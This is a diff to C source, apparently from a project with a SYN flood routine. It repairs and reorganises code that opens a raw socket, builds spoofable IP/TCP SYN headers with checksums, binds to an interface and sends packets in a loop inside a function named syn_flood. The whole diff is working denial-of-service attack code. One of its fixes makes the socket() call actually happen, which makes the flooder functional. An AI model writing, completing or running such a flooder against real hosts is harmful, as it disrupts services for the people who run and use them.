@@ -213,29 +213,14 @@ uint16_t tcp4_checksum (struct iphdr &iphdr, struct tcphdr &tcphdr) {
     return checksum ((uint16_t *) buf, chksumlen);
 }
 
-int send_syn_packet(int syn_socket, syn_header_t &syn_header, const char *eth) {
-    int on = 1;
-    int rc = setsockopt(syn_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
-    if (rc == -1) {
-        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
-        return -1;
-    }
-
+int send_syn_packet(int syn_socket, syn_header_t &syn_header) {
     struct sockaddr_in target;
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_addr.s_addr = syn_header.ip_header.daddr;
+    target.sin_port = syn_header.tcp_header.th_dport;
 
-    struct ifreq ifr;
-    memset(&ifr, 0, sizeof(ifr));
-    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", eth);
-    rc = setsockopt(syn_socket, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
-    if (rc < 0) {
-        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
-        return -1;
-    }
-
-    rc = sendto(syn_socket, &syn_header, sizeof(syn_header), 0, (struct sockaddr *)&target, sizeof(target));
+    int rc = sendto(syn_socket, &syn_header, sizeof(syn_header_t), 0, (struct sockaddr *)&target, sizeof(target));
     if (rc < 0) {
         SF_SYSLOG("sendto(%d) failed. (%s)", syn_socket, strerror(errno));
         return -1;
@@ -258,12 +243,19 @@ int syn_flood() {
         return -1;
     }
 
-    int syn_socket = (AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int on = 1;
+    int syn_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (syn_socket < 0) {
         SF_SYSLOG("create syn_socket failed. (%s)", strerror(errno));
         return -1;
     } else {
         SF_SYSLOG("create raw socket (%d)", syn_socket);
+    }
+
+    rc = setsockopt(syn_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
+    if (rc == -1) {
+        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
+        return -1;
     }
 
     char ip[INET_ADDRSTRLEN];
@@ -273,6 +265,15 @@ int syn_flood() {
         get_ethname_by_ip(ip, eth, IF_NAMESIZE);
     } else
         strcpy(eth, g_config.eth);
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(ifr));
+    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", eth);
+    rc = setsockopt(syn_socket, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
+    if (rc < 0) {
+        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
+        return -1;
+    }
 
     uint16_t ip_packet_id = 0xAAAA; /* unique id of IP packet, increase by 1 */
     uint32_t tcp_syn_seq = time(0); /* unique sequence number of TCP SYN packet, increase by 10 */
@@ -287,7 +288,7 @@ int syn_flood() {
         syn_header.tcp_header.th_sum = 0;
         syn_header.tcp_header.th_sum = tcp4_checksum(syn_header.ip_header, syn_header.tcp_header);
 
-        rc = send_syn_packet(syn_socket, syn_header, eth);
+        rc = send_syn_packet(syn_socket, syn_header);
         if (rc < 0) {
             SF_SYSLOG("send syn packet failed.");
             continue;
